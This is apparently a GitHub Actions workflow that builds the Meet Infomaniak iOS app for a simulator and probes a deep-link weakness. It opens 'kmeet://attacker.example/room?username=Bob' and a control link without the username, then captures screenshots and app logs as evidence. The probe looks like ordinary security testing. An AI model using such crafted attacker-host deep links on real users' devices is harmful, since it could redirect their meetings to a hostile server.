name: kmeet-probe
on: workflow_dispatch

jobs:
  probe:
    runs-on: macos-latest
    timeout-minutes: 150
    steps:
      - uses: actions/checkout@v4

      - name: Toolchain
        run: |
          uname -a
          xcodebuild -version
          xcrun simctl list devices available | grep -i iphone | head -8

      - name: Build for simulator
        run: |
          set -o pipefail
          xcodebuild -project MeetInfomaniak.xcodeproj -scheme MeetInfomaniak -sdk iphonesimulator -configuration Debug -derivedDataPath "$PWD/build" -destination 'generic/platform=iOS Simulator' CODE_SIGNING_ALLOWED=NO CODE_SIGNING_REQUIRED=NO CODE_SIGN_IDENTITY="" build 2>&1 | tail -40

      - name: App bundle
        run: |
          find build/Build/Products -maxdepth 2 -name "*.app" -print

      - name: Pick simulator
        run: |
          UDID=$(xcrun simctl list devices available | grep -m1 -i "iPhone" | sed -E 's/.*\(([0-9A-Fa-f-]{36})\).*/\1/')
          echo "simulator udid: $UDID"
          echo "UDID=$UDID" >> "$GITHUB_ENV"

      - name: Boot and install
        run: |
          xcrun simctl boot "$UDID" || true
          xcrun simctl bootstatus "$UDID" -b || true
          APP=$(find build/Build/Products -maxdepth 2 -name "MeetInfomaniak.app" | head -1)
          echo "app: $APP"
          xcrun simctl install "$UDID" "$APP"
          xcrun simctl io "$UDID" screenshot baseline.png || true

      - name: Deep link with attacker host and username
        run: |
          xcrun simctl terminate "$UDID" com.infomaniak.meet || true
          sleep 1
          xcrun simctl openurl "$UDID" "kmeet://attacker.example/room?username=Bob"
          sleep 4
          xcrun simctl io "$UDID" screenshot deeplink-t4.png || true
          sleep 6
          xcrun simctl io "$UDID" screenshot deeplink-t10.png || true
          sleep 10
          xcrun simctl io "$UDID" screenshot deeplink-t20.png || true

      - name: Logs
        run: |
          xcrun simctl spawn "$UDID" log show --last 3m --style compact --predicate 'processImagePath CONTAINS "MeetInfomaniak"' > applog.txt 2>&1 || true
          echo "=== attacker.example references ==="
          grep -i "attacker.example" applog.txt | head -30 || echo "none"
          echo "=== config/jitsi ==="
          grep -iE "config|jitsi|conference" applog.txt | head -30 || true

      - name: Control without username param
        run: |
          xcrun simctl terminate "$UDID" com.infomaniak.meet || true
          sleep 1
          xcrun simctl openurl "$UDID" "kmeet://attacker.example/room"
          sleep 8
          xcrun simctl io "$UDID" screenshot control-no-username.png || true

      - name: Upload
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: kmeet-evidence
          path: |
            *.png
            applog.txt
          if-no-files-found: warn
